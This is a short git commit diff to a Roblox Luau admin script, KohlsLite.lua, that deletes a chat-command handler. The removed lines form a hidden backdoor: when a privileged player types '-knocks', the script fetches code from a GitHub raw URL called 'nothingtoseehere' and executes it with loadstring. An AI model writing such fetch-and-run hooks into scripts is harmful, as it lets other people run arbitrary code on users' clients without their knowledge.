f8e4fcac9f9950e09a6dda7eedfd372d5be78bdf
TheGodE6 <110555637+TheGodE6@users.noreply.github.com>
2024-07-25 09:40:58 -0400

    Update KohlsLite.lua

--- Luau/KAH/Main Scripts/KohlsLite.lua
+++ Luau/KAH/Main Scripts/KohlsLite.lua
@@ -8352,10 +8352,6 @@ v.Chatted:Connect(function(msg)
                                 end)
                 end
 
-		if string.sub(msg:lower(), 0, 7) == "-knocks" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                                pcall(function()
-                                   loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/bswl/main/nothingtoseehere"))()
-                                end)
                 end
 
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
